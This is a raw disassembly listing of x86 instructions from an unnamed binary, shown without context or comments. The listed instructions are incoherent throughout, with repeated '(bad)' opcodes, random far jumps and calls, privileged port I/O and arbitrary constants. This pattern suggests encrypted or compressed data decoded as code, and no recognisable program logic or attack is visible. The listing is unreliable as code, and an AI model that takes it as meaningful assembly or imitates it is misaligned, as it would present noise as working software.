  4163a3:	xlat   BYTE PTR ds:[ebx]
  4163a4:	and    al,BYTE PTR [esi-0x5b]
  4163a7:	jbe    0x4163ef
  4163a9:	and    DWORD PTR [ecx-0x2a5c031c],edi
  4163af:	mov    al,0x2e
  4163b1:	push   edi
  4163b2:	lahf   
  4163b3:	call   0x6be1:0x63b4b7c6
  4163ba:	nop
  4163bb:	push   eax
  4163bc:	xor    dh,BYTE PTR [ebx+0x5c]
  4163bf:	jns    0x4163f4
  4163c1:	popf   
  4163c2:	mov    ds:0x499c000,al
  4163c7:	mov    cl,0x19
  4163c9:	mov    dh,BYTE PTR [eax-0x7d2b62a7]
  4163cf:	nop
  4163d0:	xchg   ecx,eax
  4163d1:	loopne 0x416428
  4163d3:	jmp    0xd35f:0xe81ec703
  4163da:	test   BYTE PTR [eax-0x117db24a],dh
  4163e0:	or     ebx,edi
  4163e2:	inc    ebx
  4163e3:	cdq    
  4163e4:	jl     0x416408
  4163e6:	loope  0x416370
  4163e8:	inc    eax
  4163e9:	sub    dl,BYTE PTR [edi+0x32]
  4163ec:	push   ecx
  4163ed:	mov    esi,0x3f56f233
  4163f2:	imul   edi
  4163f4:	jns    0x4163cc
  4163f6:	and    BYTE PTR ds:0xfe7568a0,ch
  4163fc:	clc    
  4163fd:	fwait
  4163fe:	sbb    bl,BYTE PTR [ebx-0x4de3b44d]
  416404:	sbb    BYTE PTR [eax],dl
  416406:	(bad)  
  416407:	(bad)  
  416409:	test   BYTE PTR [esi-0x75],0x2
  41640d:	clc    
  41640e:	mov    al,ds:0xc3
	...
  416473:	add    bl,dh
  416475:	inc    ebx
  416476:	ror    cl,1
  416478:	lock (bad) 
  41647b:	jnp    0x41640b
  41647d:	xor    al,0x5a
  41647f:	xchg   esi,eax
  416480:	cwde   
  416481:	ret    
  416482:	xchg   ebp,eax
  416483:	pop    ebx
  416484:	inc    eax
  416485:	jmp    0x416487
  416487:	add    BYTE PTR [ecx+eax*1],al
  41648a:	add    BYTE PTR [eax],al
  41648c:	call   0xcc2e3d79
  416491:	nop
  416492:	sbb    ebx,DWORD PTR [ebp-0x50]
  416495:	mov    ebx,0x4d49e8fc
  41649a:	and    bh,bl
  41649c:	xor    al,0x11
  41649e:	mov    al,0x51
  4164a0:	adc    al,BYTE PTR [edi]
  4164a2:	jae    0x416443
  4164a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4164a5:	(bad)  
  4164a6:	ret    0x2ee9
  4164a9:	sbb    cl,BYTE PTR [esi-0x5c]
  4164ac:	stc    
  4164ad:	into   
  4164ae:	je     0x4164d3
  4164b0:	sbb    eax,DWORD PTR [ebp+edi*4+0x26]
  4164b4:	ja     0x416526
  4164b6:	es xor al,0x99
  4164b9:	pop    ebp
  4164ba:	das    
  4164bb:	xchg   ecx,eax
  4164bc:	fwait
  4164bd:	idiv   ebx
  4164bf:	nop
  4164c0:	xor    dl,BYTE PTR [ebx+0x14e50fa7]
  4164c6:	lods   al,BYTE PTR ds:[esi]
  4164c7:	push   0x55
  4164c9:	jb     0x416503
  4164cb:	popa   
  4164cc:	clc    
  4164cd:	lods   eax,DWORD PTR ds:[esi]
  4164ce:	push   ecx
  4164cf:	sub    BYTE PTR [edi+0x4f970c0b],ch
  4164d5:	adc    ecx,DWORD PTR [ecx+0x16a80]
  4164db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4164dc:	pop    ebp
  4164dd:	dec    ebx
  4164de:	ds daa 
  4164e0:	adc    BYTE PTR [ebx+0x4974f4b7],dl
  4164e6:	std    
  4164e7:	mov    dl,0x5b
  4164e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4164eb:	add    ah,BYTE PTR [ebp+0x4fa113a]
  4164f1:	dec    esp
  4164f2:	cwde   
  4164f3:	dec    ebp
  4164f4:	call   0xf52260eb
  4164f9:	dec    esi
  4164fa:	mov    dh,0x6
  4164fc:	fcomp  DWORD PTR [ebx-0x28b70458]
  416502:	xor    al,0x7b
  416504:	jp     0x416564
  416506:	jne    0x41655d
  416508:	push   ebp
  416509:	iret   
  41650a:	push   esp
  41650b:	neg    BYTE PTR [esi+0x7c530393]
  416511:	jmp    0x40b1:0x1240d177
  416518:	adc    cl,BYTE PTR [eax+edi*8-0x1]
  41651c:	pop    ss
  41651d:	(bad)  
  41651e:	xor    DWORD PTR [ecx],edi
  416520:	mov    DWORD PTR [ebx+0x3cf91bc5],eax
  416526:	aad    0x30
  416528:	outs   dx,DWORD PTR ds:[esi]
  416529:	push   esi
  41652a:	push   ds
  41652b:	pop    edx
  41652c:	xor    esp,edi
  41652e:	stc    
  41652f:	jp     0x416504
  416531:	push   DWORD PTR [esi+0x69]
  416534:	retf   
  416535:	jo     0x416569
  416537:	mov    edi,0x44bdbd23
  41653c:	int3   
  41653d:	aad    0xb0
  41653f:	sbb    DWORD PTR [ebx+0x6c],esp
  416542:	fcmovnu st,st(6)
  416544:	imul   esp,DWORD PTR [eax-0x4b],0xbea8a81e
  41654b:	or     BYTE PTR [ebp+0x67],al
  41654e:	inc    edi
  41654f:	jne    0x4164ea
  416551:	test   al,0xb5
  416553:	add    DWORD PTR [esi],eax
  416555:	and    ebp,esp
  416557:	mov    bh,0x93
  416559:	pop    eax
  41655a:	lods   al,BYTE PTR ds:[esi]
  41655b:	cwde   
  41655c:	or     eax,0xf0fe97c6
  416561:	or     ch,al
  416563:	xor    eax,0xafa56848
  416568:	data16 in al,0x91
  41656b:	add    al,0x18
  41656d:	mov    edi,0xf3f7d3f0
  416572:	xchg   ebp,eax
  416573:	dec    edx
  416574:	lods   eax,DWORD PTR ds:[esi]
  416575:	sbb    al,ah
  416577:	ret    
  416578:	fdivr  st,st(0)
  41657a:	sub    BYTE PTR [esi+0xb],0xb
  41657e:	test   eax,0xaf6b1cba
  416583:	sub    cl,BYTE PTR [edi+0x5]
  416586:	sbb    eax,0x6086d5a
  41658b:	push   edi
  41658c:	jp     0x416532
  41658e:	ss clc 
	...
  4165f4:	and    eax,0xfff32bd8
  4165f9:	repz std 
  4165fb:	fisub  WORD PTR [esi-0x2fb04354]
  416601:	add    ch,ch
  416603:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416604:	inc    esp
  416605:	in     al,dx
  416606:	add    BYTE PTR [eax],al
  416608:	add    al,0x1
  41660a:	add    BYTE PTR [eax],al
  41660c:	sbb    BYTE PTR ds:0x9ac89cc2,0xef
  416613:	xchg   edx,eax
  416614:	mov    ebx,0xdc27a9ec
  416619:	icebp  
  41661a:	jne    0x4165eb
  41661c:	xor    cl,dl
  41661e:	add    al,0x9
  416620:	test   al,0x78
  416622:	or     ebp,ebp
  416624:	or     cl,BYTE PTR [edx+0x1]
  416627:	mov    edx,0x1c75d853
  41662c:	call   0x207eb65
  416631:	sbb    eax,0x8c312bb9
  416636:	jno    0x416624
  416638:	call   FWORD PTR ds:0x3f617e17
  41663e:	jae    0x416672
  416640:	retf   0x4502
  416643:	jl     0x4165d1
  416645:	sub    al,0x73
  416647:	in     al,dx
  416648:	mov    bl,0xd4
  41664a:	mov    cl,0x2e
  41664c:	mov    ecx,0xe748e02
  416651:	inc    edi
  416652:	xchg   ebp,eax
  416653:	test   eax,0x951e0bbd
  416658:	in     al,dx
  416659:	mov    ecx,0xeb257d64
  41665e:	es push ecx
  416660:	jno    0x41664e
  416662:	loopne 0x4166d5
  416664:	mov    eax,ds:0x101200e0
  416669:	loopne 0x416682
  41666b:	mov    eax,0x853af87c
  416670:	and    eax,0x6e0b96d7
  416675:	adc    BYTE PTR [edi+0x7e],al
  416678:	or     eax,0xaf849c8b
  41667d:	xchg   edx,eax
  41667e:	mov    esi,0xaad1f482
  416683:	and    BYTE PTR [ebx+0x30],dh
  416686:	mov    edx,ds
  416688:	lods   al,BYTE PTR ds:[esi]
  416689:	pop    ds
  41668a:	adc    bh,BYTE PTR fs:[esi]
  41668d:	(bad)  
  41668e:	call   0x73d2f0d1
  416693:	inc    DWORD PTR [edx+0x7bd4e66e]
  416699:	and    DWORD PTR [edi+0x63],ebx
  41669c:	das    
  41669d:	cli    
  41669e:	jne    0x41670f
  4166a0:	add    eax,0xd2bec304
  4166a5:	dec    edi
  4166a6:	add    BYTE PTR [edx-0x687839a],dh
  4166ac:	push   ds
  4166ad:	fsubr  DWORD PTR [eax+edi*2+0x56]
  4166b1:	popa   
  4166b2:	inc    esp
  4166b3:	jp     0x416688
  4166b5:	inc    eax
  4166b6:	ror    BYTE PTR [eax+0x548d5331],cl
  4166bc:	scas   al,BYTE PTR es:[edi]
  4166bd:	cdq    
  4166be:	xchg   ebx,eax
  4166bf:	popaw  
  4166c1:	push   cs
  4166c2:	ret    
  4166c3:	sbb    esp,0xffffffa1
  4166c6:	call   0x7166:0x61162763
  4166cd:	xchg   esi,eax
  4166ce:	stos   BYTE PTR es:[edi],al
  4166cf:	pop    ebx
  4166d0:	sub    DWORD PTR [ebp+0x7],eax
  4166d3:	hlt    
  4166d4:	rcr    DWORD PTR [esi-0x66],0x3d
  4166d8:	jmp    0x150f:0xc17d08fc
  4166df:	inc    edi
  4166e0:	shl    DWORD PTR [esi],cl
  4166e2:	sub    bh,cl
  4166e4:	xchg   esi,eax
  4166e5:	adc    BYTE PTR [edi+0x358aef2b],dl
  4166eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4166ec:	mov    cl,0x90
  4166ee:	imul   ebp,ecx,0xffffffb7
  4166f1:	dec    ecx
  4166f2:	mov    al,0x3a
  4166f4:	jl     0x416687
  4166f6:	ror    DWORD PTR [eax-0xa],cl
  4166f9:	(bad)  [esi]
  4166fb:	aam    0xae
  4166fd:	inc    ecx
  4166fe:	sub    ecx,DWORD PTR [esi]
  416700:	sbb    bl,BYTE PTR [esi-0x1e]
  416703:	data16 sti 
  416705:	xchg   ecx,eax
  416706:	int3   
  416707:	inc    edx
  416708:	aas    
  416709:	ss sti 
  41670b:	test   dh,bh
  41670d:	fwait
  41670e:	dec    esi
  41670f:	dec    edi
	...
  416774:	(bad)  
  416775:	(bad)  
  416777:	(bad)  
  416778:	(bad)  
  41677a:	out    0xff,eax
  41677c:	sbb    edi,DWORD PTR [esp+ecx*2-0x3a]
  416780:	ret    0x3020
  416783:	inc    esp
  416784:	dec    eax
  416785:	in     eax,dx
  416786:	add    BYTE PTR [eax],al
  416788:	add    al,0x1
  41678a:	add    BYTE PTR [eax],al
  41678c:	adc    dl,al
  41678e:	fdiv   QWORD PTR [edx]
  416790:	inc    ebx
  416791:	cld    
  416792:	addr16 inc edx
  416794:	dec    esi
  416795:	push   ds
  416796:	push   ebx
  416797:	mov    ds:0x49930cdf,eax
  41679c:	jge    0x41679a
  41679e:	scas   al,BYTE PTR es:[edi]
  41679f:	sahf   
  4167a0:	xor    al,0x9c
  4167a2:	sub    DWORD PTR [edi-0x4a],0x74
  4167a6:	dec    ebp
  4167a7:	xchg   ecx,eax
  4167a8:	sub    eax,ebp
  4167aa:	fnstenvw [ecx+esi*1]
  4167ae:	jp     0x4167ab
  4167b0:	not    DWORD PTR [eax-0x638782a8]
  4167b6:	fwait
  4167b7:	adc    BYTE PTR [edi-0xe],al
  4167ba:	xchg   ebx,eax
  4167bb:	out    0xad,al
  4167bd:	lods   al,BYTE PTR fs:[esi]
  4167bf:	loopne 0x416817
  4167c1:	and    BYTE PTR [esi],bl
  4167c3:	jecxz  0x4167c9
  4167c5:	push   ebx
  4167c6:	and    eax,0x484e33ad
  4167cb:	sub    BYTE PTR [ebp+0x61650d9b],ah
  4167d1:	sbb    BYTE PTR [ebp+0x60],bh
  4167d4:	xor    al,0xbd
  4167d6:	mov    dl,0x8e
  4167d8:	or     ebx,0x1f
  4167db:	(bad)  
  4167dc:	int3   
  4167dd:	and    DWORD PTR [ebp+0x46401f34],0xad71bdd8
  4167e7:	mov    ch,0x1c
  4167e9:	je     0x4167d9
  4167eb:	mov    al,0x2c
  4167ed:	xor    DWORD PTR [esi+edi*4-0x49a1ef95],ebp
  4167f4:	add    cl,BYTE PTR [ebp+ebp*8-0x3e3f56d8]
  4167fb:	pop    ebp
  4167fc:	aaa    
  4167fd:	xchg   edx,eax
  4167fe:	ss int 0xe5
  416801:	in     al,dx
  416802:	push   ds
  416803:	daa    
  416804:	push   ebx
  416805:	dec    ecx
  416806:	push   bx
  416808:	push   0xffffff98
  41680a:	adc    al,0x55
  41680c:	add    al,0x81
  41680e:	push   ebp
  41680f:	lods   al,BYTE PTR ds:[esi]
  416810:	mov    bl,0x92
  416812:	test   BYTE PTR [ecx],cl
  416814:	mov    ds:0x69741e30,al
  416819:	retf   0x4b5
  41681c:	push   cs
  41681d:	popf   
  41681e:	aas    
  41681f:	mul    DWORD PTR [eax+0x271cb2fb]
  416825:	cs test eax,0xa0e2ed80
  41682b:	int3   
  41682c:	add    al,0x70
  41682e:	push   cs
  41682f:	(bad)  
  416830:	or     edx,DWORD PTR [edx+esi*8+0x49]
  416834:	scas   eax,DWORD PTR es:[edi]
  416835:	shl    BYTE PTR [edx],0x61
  416838:	mov    eax,ds:0x323bc7de
  41683d:	inc    ebp
  41683e:	lahf   
  41683f:	sbb    edi,ebx
  416841:	(bad)  
  416842:	sub    ch,BYTE PTR [ebp+0xc]
  416845:	fcom   QWORD PTR [edx+esi*4]
  416848:	and    DWORD PTR [ebx+0x78c1cafd],edi
  41684e:	or     ebp,edx
  416850:	js     0x4168cf
  416852:	sbb    eax,0xb24e7eda
  416857:	adc    DWORD PTR [eax],edx
  416859:	(bad)  
  41685a:	btc    DWORD PTR [ebx],ebx
  41685d:	stos   DWORD PTR es:[edi],eax
  41685e:	int3   
  41685f:	fcomp  QWORD PTR ds:[esi]
  416862:	jmp    0x4308:0xe4288fe5
  416869:	(bad)  
  41686a:	pop    eax
  41686b:	lock in eax,dx
  41686d:	or     al,0xa2
  41686f:	test   DWORD PTR fs:[edi+0x1aa51321],esi
  416876:	scas   eax,DWORD PTR es:[edi]
  416877:	lock ret 
  416879:	(bad)  
  41687a:	mov    bh,cl
  41687c:	xor    eax,0x6e9115f9
  416881:	sub    eax,DWORD PTR [ebx+esi*8+0x60]
  416885:	lds    esi,FWORD PTR [edi]
  416887:	xor    esp,esi
  416889:	pop    esi
  41688a:	dec    ebp
  41688b:	dec    eax
  41688c:	push   eax
  41688d:	xchg   ebp,eax
  41688e:	retf   
  41688f:	mov    dh,0x0
	...
  4168f1:	add    BYTE PTR [eax],al
  4168f3:	add    cl,dl
  4168f5:	scas   eax,DWORD PTR es:[edi]
  4168f6:	push   es
  4168f7:	repz jle 0x4168f5
  4168fa:	cmc    
  4168fb:	scas   eax,DWORD PTR es:[edi]
  4168fc:	sub    DWORD PTR [edi-0x5d],edi
  4168ff:	mov    ebp,0xabaac392
  416904:	dec    esp
  416905:	out    dx,al
  416906:	add    BYTE PTR [eax],al
  416908:	add    al,0x1
  41690a:	add    BYTE PTR [eax],al
  41690c:	inc    esp
  41690d:	outs   dx,BYTE PTR es:[esi]
  41690f:	bound  esi,QWORD PTR [ebx]
  416911:	test   al,0x3c
  416913:	pop    edi
  416914:	dec    ecx
  416915:	push   esi
  416916:	in     al,0xde
  416918:	inc    edi
  416919:	jbe    0x416936
  41691b:	push   ds
  41691c:	mov    cl,0x16
  41691e:	mov    ebx,0x831923c1
  416923:	leave  
  416924:	pop    ebp
  416925:	(bad)  
  416927:	gs push eax
  416929:	push   edi
  41692a:	in     eax,0x5d
  41692c:	inc    ecx
  41692d:	cmp    al,0x35
  41692f:	sub    eax,0x1c584ea1
  416934:	adc    al,0x21
  416936:	and    dl,dl
  416938:	sar    BYTE PTR [esi+0x35027530],1
  41693e:	mov    ecx,0x7c08b5b0
  416943:	out    dx,al
  416944:	dec    ebp
  416945:	lock arpl WORD PTR [edi-0x1f976b6a],bx
  41694c:	daa    
  41694d:	xor    BYTE PTR [ebx],al
  41694f:	push   0x1e
  416951:	in     eax,dx
  416952:	outs   dx,DWORD PTR ds:[esi]
  416953:	outs   dx,BYTE PTR ds:[esi]
  416954:	mov    BYTE PTR [esi],bl
  416956:	call   0xf31:0x55faea69
  41695d:	out    0x32,al
  41695f:	fwait
  416960:	ds push cs
  416962:	mov    eax,0x427b0d5a
  416967:	adc    cl,BYTE PTR fs:[edi+0x4b]
  41696b:	sbb    edi,ebx
  41696d:	or     dh,BYTE PTR [ebx]
  41696f:	(bad)  
  416971:	es mov cl,0xa
  416974:	xchg   ecx,eax
  416976:	cld    
  416977:	mov    ds:0xe6638c60,al
  41697c:	jle    0x41696d
  41697e:	sar    DWORD PTR [edi-0x6d8e4562],0x53
  416985:	dec    esp
  416986:	or     al,0xd3
  416988:	mov    ds:0xbedaba88,al
  41698d:	leave  
  41698e:	not    BYTE PTR [eax-0x4f8d22ba]
  416994:	xchg   BYTE PTR [ecx],ah
  416996:	and    eax,0x1feb931
  41699b:	popf   
  41699c:	out    dx,al
  41699d:	in     eax,0x78
  41699f:	inc    edi
  4169a0:	psubw  mm3,QWORD PTR [edi+ebx*8]
  4169a4:	adc    DWORD PTR gs:[ebp-0x33],edi
  4169a8:	sbb    al,BYTE PTR [ebx-0x2e]
  4169ab:	mov    eax,ds:0xb0f4f73e
  4169b0:	or     al,0xb4
  4169b2:	add    eax,0x7a72ea95
  4169b7:	out    0xa5,eax
  4169b9:	mul    DWORD PTR [ecx-0x5b]
  4169bc:	imul   ebx,DWORD PTR [eax],0xffffffee
  4169bf:	(bad)  [ebp-0x12fd8a95]
  4169c5:	ret    0x30a6
  4169c8:	push   cs
  4169c9:	xchg   edi,eax
  4169ca:	fsubr  st(4),st
  4169cc:	lahf   
  4169cd:	dec    edx
  4169ce:	cli    
  4169cf:	mov    BYTE PTR [esi-0x58d27e19],0x56
  4169d6:	inc    esp
  4169d7:	or     DWORD PTR [edx-0x2f61d296],esi
  4169dd:	pop    ecx
  4169de:	mov    DWORD PTR [esi-0x2c2c9767],eax
  4169e4:	xor    al,0xd5
  4169e6:	xchg   ebp,eax
  4169e7:	or     eax,0x966fea8c
  4169ec:	dec    ebp
  4169ed:	aam    0x71
  4169ef:	pop    ebx
  4169f0:	push   esp
  4169f1:	sub    al,0x93
  4169f3:	mov    ebp,0x3069f24a
  4169f8:	jae    0x416996
  4169fa:	pop    esp
  4169fb:	fs in  al,0x9b
  4169fe:	or     eax,0xca697e89
  416a03:	sahf   
  416a04:	or     ebx,ebx
  416a06:	jo     0x4169bd
  416a08:	xchg   ecx,eax
  416a09:	clc    
  416a0a:	push   esi
  416a0b:	mov    al,ds:0x2ad90ecd
	...
  416a74:	retf   
  416a75:	pusha  
  416a76:	ror    BYTE PTR [ebx+0x60dbbbfb],1
  416a7c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416a7d:	mov    al,ds:0xf8650ba3
  416a82:	test   al,0xa
  416a84:	push   eax
  416a85:	out    dx,eax
  416a86:	add    BYTE PTR [eax],al
  416a88:	add    al,0x1
  416a8a:	add    BYTE PTR [eax],al
  416a8c:	std    
  416a8d:	clc    
  416a8e:	jmp    0x416a88
  416a90:	cmp    DWORD PTR [esi+0x20],esp
  416a93:	icebp  
  416a94:	retf   0x98bc
  416a97:	add    bh,bl
  416a99:	in     eax,dx
  416a9a:	loope  0x416a96
  416a9c:	cld    
  416a9d:	adc    al,0xe8
  416a9f:	out    0xcf,eax
  416aa1:	leave  
  416aa2:	push   ds
  416aa3:	mov    al,ds:0x45410ff7
  416aa8:	pop    eax
  416aa9:	mov    edx,0x4e85c37e
  416aae:	jle    0x416b19
  416ab0:	jmp    0x26146190
  416ab5:	or     esi,DWORD PTR [esi+ecx*8-0x2b88e95b]
  416abc:	repz dec ebx
  416abe:	data16 icebp 
  416ac0:	repnz pop ebp
  416ac2:	push   esi
  416ac3:	bound  edx,QWORD PTR [esi+0x51]
  416ac6:	in     al,0x29
  416ac8:	loopne 0x416a51
  416aca:	pop    ebx
  416acb:	mov    eax,ds:0xcbe5969a
  416ad0:	sti    
  416ad1:	adc    cl,ah
  416ad3:	mov    al,0xaa
  416ad5:	test   eax,0x2c31e44a
  416ada:	outs   dx,DWORD PTR ds:[esi]
  416adb:	xor    eax,0xc1792630
  416ae0:	sti    
  416ae1:	out    0x6c,eax
  416ae3:	pop    edx
  416ae4:	jecxz  0x416afc
  416ae6:	lahf   
  416ae7:	pop    esi
  416ae8:	(bad)  
  416ae9:	std    
  416aea:	mov    cl,0xea
  416aec:	and    BYTE PTR [eax-0x80],ah
  416aef:	inc    edx
  416af0:	mov    esi,DWORD PTR [ebx-0x6e21ce69]
  416af6:	sbb    cl,al
  416af8:	ins    BYTE PTR es:[edi],dx
  416af9:	shl    DWORD PTR [eax],0xca
  416afc:	mov    ah,BYTE PTR [esi+0x1d]
  416aff:	ss out 0xd2,al
  416b02:	iret   
  416b03:	hlt    
  416b04:	out    dx,al
  416b05:	sub    DWORD PTR [ecx+0x21],esp
  416b08:	bound  ebp,QWORD PTR [ebp-0x57]
  416b0b:	cmp    esp,DWORD PTR [ecx]
  416b0d:	jbe    0x416acd
  416b0f:	push   es
  416b10:	outs   dx,BYTE PTR ds:[esi]
  416b11:	xchg   edx,eax
  416b12:	add    al,ah
  416b14:	aaa    
  416b15:	mov    ah,0xce
  416b17:	ins    BYTE PTR es:[edi],dx
  416b18:	js     0x416b18
  416b1a:	cmp    eax,0x64e508f4
  416b1f:	aam    0xb1
  416b21:	cli    
  416b22:	out    dx,eax
  416b23:	daa    
  416b24:	jns    0x416b11
  416b26:	mov    edx,0x2a731b2d
  416b2b:	lock or ebx,DWORD PTR [eax+0x4ec03736]
  416b32:	pop    edi
  416b33:	mov    al,0x8c
  416b35:	jo     0x416ba6
  416b37:	xor    dl,BYTE PTR [eax-0x39ea06ef]
  416b3d:	pushf  
  416b3e:	xchg   edi,eax
  416b3f:	mov    edi,0x1fa40931
  416b44:	cmc    
  416b45:	ret    0xa878
  416b48:	pushf  
  416b49:	xchg   esi,eax
  416b4a:	xchg   esi,eax
  416b4b:	xchg   ebx,eax
  416b4c:	(bad)  
  416b4d:	test   al,0x0
  416b4f:	xchg   ecx,eax
  416b50:	into   
  416b51:	jp     0x416b80
  416b53:	pop    ebx
  416b54:	xor    BYTE PTR [esp+ebx*1-0x1e40eca3],bh
  416b5b:	cmp    ebp,0x25322cf9
  416b61:	cdq    
  416b62:	jnp    0x416bc8
  416b64:	out    0x9b,eax
  416b66:	dec    ebx
  416b67:	push   ecx
  416b68:	sbb    esp,DWORD PTR [edi+esi*1]
  416b6b:	jecxz  0x416af4
  416b6d:	aaa    
  416b6e:	xor    eax,0xba74bd62
  416b73:	fcmovne st,st(4)
  416b75:	cwde   
  416b76:	aad    0xa4
  416b78:	adc    al,ch
  416b7a:	or     ecx,edi
  416b7c:	mov    esp,DWORD PTR [edx+0x56]
  416b7f:	pop    DWORD PTR [edi]
  416b81:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416b82:	cmp    eax,0x70b13ed3
  416b87:	test   edx,ebp
  416b89:	fcomp  st(4)
  416b8b:	sbb    bl,BYTE PTR [ebp+0x3515d3]
	...
  416bf1:	add    BYTE PTR [eax],al
  416bf3:	add    bl,ah
  416bf5:	gs push cs
  416bf7:	test   DWORD PTR [esi-0x38a0401],0x195b70a9
  416c01:	mov    al,ds:0xf054f407
  416c06:	add    BYTE PTR [eax],al
  416c08:	add    al,0x1
  416c0a:	add    BYTE PTR [eax],al
  416c0c:	jg     0x416baa
  416c0e:	or     DWORD PTR [edi],edx
  416c10:	xchg   al,ch
  416c12:	push   edi
  416c13:	call   0xe49a70dd
  416c18:	mov    edi,ecx
  416c1a:	push   es
  416c1b:	mov    ah,0xde
  416c1d:	dec    eax
  416c1e:	icebp  
  416c1f:	sub    eax,0x183bda95
  416c24:	push   esi
  416c25:	sub    al,0x23
  416c27:	hlt    
  416c28:	test   al,0x9b
  416c2a:	add    BYTE PTR [ebx],al
  416c2c:	ins    DWORD PTR es:[edi],dx
  416c2d:	and    BYTE PTR gs:[edi+0x8],0xdc
  416c32:	jmp    0x428d7961
  416c37:	jo     0x416c67
  416c39:	data16 mov ss,WORD PTR [esi]
  416c3c:	fld    st(4)
  416c3e:	add    BYTE PTR [edi+0x47d2d8ba],dl
  416c44:	cs add eax,0x5e353994
  416c4a:	std    
  416c4b:	pop    esi
  416c4c:	sbb    al,0x89
  416c4e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416c4f:	ds xchg esp,eax
  416c51:	call   0xa15c:0x1616cce7
  416c58:	pop    esp
  416c59:	je     0x416cc3
  416c5b:	inc    ecx
  416c5c:	out    dx,eax
  416c5d:	sti    
  416c5e:	dec    esi
  416c5f:	dec    edx
  416c60:	repnz arpl ax,ax
  416c63:	shl    dh,0xe5
  416c66:	cli    
  416c67:	pushf  
  416c68:	mov    esi,DWORD PTR [eax+0x2adeaefe]
  416c6e:	dec    ebp
  416c6f:	ss jmp 0xaabb:0xbdc44a8e
  416c77:	out    dx,eax
  416c78:	jmp    0xb745:0xd4487db8
  416c7f:	out    0x44,eax
  416c81:	and    edi,DWORD PTR [esi-0x1e]
  416c84:	jno    0x416c50
  416c86:	mov    ch,BYTE PTR [edi+0x6e0ee02d]
  416c8c:	xlat   BYTE PTR ds:[ebx]
  416c8d:	scas   eax,DWORD PTR es:[edi]
  416c8e:	pop    esi
  416c8f:	shl    BYTE PTR [edi-0x1739681d],cl
  416c95:	fadd   DWORD PTR [edx+eiz*1+0x4a743286]
  416c9c:	lods   al,BYTE PTR ds:[esi]
  416c9d:	or     DWORD PTR [esi+eiz*2-0x2d3eb329],ebp
  416ca4:	and    eax,0x74af7d1a
  416ca9:	xchg   edi,eax
  416caa:	push   esi
  416cab:	in     al,0xd7
  416cad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416cae:	cmp    DWORD PTR [esi+0x59492267],0xffffff91
  416cb5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416cb6:	scas   eax,DWORD PTR es:[edi]
  416cb7:	js     0x416c54
  416cb9:	jns    0x416c73
  416cbb:	mov    bh,0x75
  416cbd:	sbb    BYTE PTR [ebx-0x6b],bh
  416cc0:	test   BYTE PTR [edi-0x397bd9f4],ah
  416cc6:	jge    0x416c62
  416cc8:	imul   ecx,DWORD PTR [eax],0xffffffc5
  416ccb:	xchg   esi,eax
  416ccc:	mov    bl,0x20
  416cce:	jo     0x416c95
  416cd0:	xlat   BYTE PTR ds:[ebx]
  416cd1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416cd2:	sub    eax,0xf63b3f40
  416cd7:	dec    edi
  416cd8:	sbb    DWORD PTR [edx+0x7a],edi
  416cdb:	sahf   
  416cdc:	out    0xaf,al
  416cde:	cwde   
  416cdf:	pop    edx
  416ce0:	mov    esi,DWORD PTR [edi-0x11]
  416ce3:	jge    0x416ce5
  416ce5:	leave  
  416ce6:	adc    DWORD PTR [ebx+0x58bcfd81],edx
  416cec:	jp     0x416cfb
  416cee:	dec    ebp
  416cef:	int    0x8e
  416cf1:	xchg   esp,eax
  416cf2:	aam    0xec
  416cf4:	adc    eax,0xf962f872
  416cf9:	dec    ebp
  416cfa:	mov    eax,0x3d29b222
  416cff:	mov    al,ds:0xe9c36265
  416d04:	jno    0x416d33
  416d06:	ja     0x416c9f
  416d08:	push   esi
  416d09:	aas    
  416d0a:	push   0xffffffd1
  416d0c:	pop    es
  416d0d:	push   ebp
  416d0e:	add    dl,BYTE PTR [esi+0x0]
	...
  416d74:	and    DWORD PTR [ebx-0x40445077],edx
  416d7a:	daa    
  416d7b:	lahf   
  416d7c:	mov    ch,0x99
  416d7e:	pop    edx
  416d7f:	das    
  416d80:	and    eax,0x58bd5264
  416d85:	icebp  
  416d86:	add    BYTE PTR [eax],al
  416d88:	add    al,0x1
  416d8a:	add    BYTE PTR [eax],al
  416d8c:	mov    ecx,0xe6caed7a
  416d91:	add    eax,0xdd84142e
  416d96:	or     ah,dl
  416d98:	pop    ss
  416d99:	and    bh,BYTE PTR [ebx-0x36ec29ac]
  416d9f:	cmp    eax,0xcd5c31e4
  416da4:	call   FWORD PTR [eax]
  416da6:	sub    al,0xec
  416da8:	push   esp
  416da9:	and    ebp,ecx
  416dab:	add    DWORD PTR [esi+0x4145b1fb],0x798b1b26
  416db5:	icebp  
  416db6:	shl    BYTE PTR [eax-0x2da45ff1],0xe4
  416dbd:	data16 (bad) 
  416dbf:	mov    ebx,0xd7c12520
  416dc4:	add    DWORD PTR [ecx+0x2d],0x4881f252
  416dcb:	loop   0x416de8
  416dcd:	xchg   esi,eax
  416dce:	or     dl,dh
  416dd0:	mov    bh,0x11
  416dd2:	lods   al,BYTE PTR ds:[esi]
  416dd3:	mul    DWORD PTR [edx+0x76]
  416dd6:	and    ecx,DWORD PTR [edx+0x2aaaf14a]
  416ddc:	mov    ds:0x110a9f86,eax
  416de1:	xor    ecx,ecx
  416de3:	lahf   
  416de4:	fild   QWORD PTR [edi]
  416de6:	cld    
  416de7:	pop    esp
  416de8:	ins    BYTE PTR es:[edi],dx
  416de9:	jne    0x416e69
  416deb:	fwait
  416dec:	xor    DWORD PTR [edi-0x6459daf],eax
  416df2:	std    
  416df3:	jle    0x416dee
  416df5:	sub    al,0x1f
  416df7:	mov    dl,0xb3
  416df9:	sbb    eax,0x382ef1c8
  416dfe:	mov    esp,0x8877cc35
  416e03:	jp     0x416de0
  416e05:	pop    eax
  416e06:	pop    eax
  416e07:	mov    esp,DWORD PTR [edi-0x5b]
  416e0a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416e0b:	push   esp
  416e0c:	test   ebp,0xec8c0823
  416e12:	push   0xb25afff7
  416e17:	int3   
  416e18:	push   ebp
  416e19:	test   eax,0xb7b94b6e
